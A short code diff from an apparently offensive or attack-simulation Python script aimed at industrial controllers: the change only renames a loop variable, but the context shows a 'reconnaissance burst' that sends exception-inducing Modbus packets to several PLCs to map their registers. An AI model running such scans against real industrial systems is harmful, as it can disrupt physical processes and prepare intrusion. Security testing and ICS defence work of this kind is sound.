@@ -32,7 +32,7 @@ print("Target: full control zone (all three PLCs)")
 # Phase 1: Reconnaissance burst (exception-inducing reads to map registers)
 print("[PHASE 1] Register scanning across all PLCs...")
 for plc in PLCS:
-    for i in range(8):
+    for _i in range(8):
         send(modbus_packet(plc, 131, b"\x00\x00\x00\x01"), verbose=False)
         time.sleep(0.05)
 
